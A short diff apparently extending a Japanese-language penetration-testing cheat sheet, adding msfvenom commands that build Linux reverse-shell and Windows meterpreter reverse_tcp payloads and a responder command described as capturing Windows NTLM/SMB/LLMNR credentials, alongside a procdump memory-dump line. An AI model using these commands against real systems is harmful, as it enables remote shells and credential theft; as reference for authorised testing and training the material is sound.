@@ -81,3 +81,16 @@ Sysinternalsツールの一つでプロセスのメモリの中身を、ダン�
 ```bash
 procdump.exe -ma <pid> <output>.dmp -accepteula
 ```
+
+# msfvenom
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<port> -f <extension> -o <File>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR IP> LPORT=<port> -f <extension> -o <File>
+```
+
+# responder
+Windowsの認証プロトコル（NTLM/SMB/LLMNR/mDNSなど）の脆弱性を悪用し、ネットワーク上で送信される認証情報をキャプチャするために使われるツール。
+```bash
+sudo responder -I <Interface>
+```
+
